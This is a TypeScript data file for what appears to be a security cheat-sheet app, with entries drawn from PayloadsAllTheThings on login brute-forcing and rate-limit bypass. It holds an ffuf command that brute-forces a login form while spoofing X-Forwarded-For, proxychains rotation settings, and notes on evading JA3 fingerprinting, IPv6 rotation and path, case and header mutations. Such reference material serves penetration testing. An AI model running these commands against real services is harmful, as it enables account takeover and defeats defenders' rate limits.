import type { CuratedCategory } from './types';

// English version of brute-force-rate-limit.ts (used for the en locale).
// Source: PayloadsAllTheThings/Brute Force Rate Limit/README.md
export const bruteForceRateLimitEn: CuratedCategory = {
  category: 'Brute Force Rate Limit',
  source: 'PayloadsAllTheThings/Brute Force Rate Limit/README.md',
  entries: [
    {
      subcategory: 'Brute force',
      title: 'FFUF: login brute force (user x pass + spoofed IP)',
      language: 'bash',
      tags: ['ffuf', 'bruteforce', 'login'],
      body: `ffuf -w usernames.txt:USER -w passwords.txt:PASS \\
     -u https://target.tld/login \\
     -X POST -d "username=USER&password=PASS" \\
     -H "Content-Type: application/x-www-form-urlencoded" \\
     -H "X-Forwarded-For: FUZZ" -w ipv4-list.txt:FUZZ \\
     -mc all`,
    },
    {
      subcategory: 'Brute force',
      title: 'Burp Intruder: attack types (cheatsheet)',
      language: 'text',
      tags: ['burp', 'intruder', 'bruteforce'],
      body: `Sniper         1 position, 1 set: iterates a single variable.
Battering ram  one payload into ALL marked positions at once.
Pitchfork      several lists in parallel: the n-th item from each (user[n]:pass[n]).
Cluster bomb   all combinations of the sets (user x pass).`,
    },
    {
      subcategory: 'Rate limit · IP rotation',
      title: 'proxychains + ffuf: a new IP on every request',
      language: 'bash',
      tags: ['proxychains', 'rate-limit', 'ip-rotation', 'ffuf'],
      body: `proxychains ffuf -w wordlist.txt -u https://target.tld/FUZZ`,
    },
    {
      subcategory: 'Rate limit · IP rotation',
      title: 'proxychains.conf: random rotation, 1 proxy per chain',
      language: 'ini',
      tags: ['proxychains', 'rate-limit', 'config'],
      body: `# /etc/proxychains.conf
random_chain        # switch the proxy on every request
chain_len = 1       # exactly one proxy per connection

[ProxyList]
# type    host               port
socks5    127.0.0.1          1080
socks5    192.168.1.50       1080
http      proxy1.example.com 8080
http      proxy2.example.com 8080`,
    },
    {
      subcategory: 'Rate limit',
      title: 'Rate-limit bypass: IP, JA3 and IPv6',
      language: 'text',
      tags: ['rate-limit', 'ja3', 'ipv6', 'bypass'],
      body: `Spoof IP   rotate X-Forwarded-For / X-Real-IP via the FUZZ header (see the ffuf command).
TLS / JA3  the server fingerprints the TLS handshake even if you swap the User-Agent.
           Bypass with curl-impersonate or a real browser (Playwright/Puppeteer).
           Known JA3 values, Burp: 53d67b2a806147a7d1d5df74b54dd049 · Tor: e7d705a3286e19ea42f587b344ee6865
IPv6 /64   providers (e.g. Vultr) hand out a /64 (~1.8e19 addresses) for mass rotation.
Tools      OmniProx (multi-cloud IP rotation), ffuf, curl-impersonate.`,
    },
    {
      subcategory: 'Rate limit',
      title: 'Rate-limit bypass: path, case and header mutations',
      language: 'text',
      tags: ['rate-limit', 'bypass', 'path', 'case', 'method', 'header', '403'],
      body: `Limiters often key the bucket on the exact path/method — a tiny mutation looks like a "new" endpoint:
Path      trailing / or //, /./, %2e, %00, ;x=1, ?cb=1, add .json — dodges a path-keyed limit.
Case      /Login instead of /login, mixed-case method (PoST) — if the key is case-sensitive.
Method    switch to another allowed verb (PUT/PATCH) or add an X-HTTP-Method-Override header.
Headers   flip Content-Type (form <-> json), add junk headers/cookies if the key includes them.
Version   HTTP/2 vs HTTP/1.1, a different host alias (www / api / raw IP) — often a separate limit.`,
    },
  ],
};
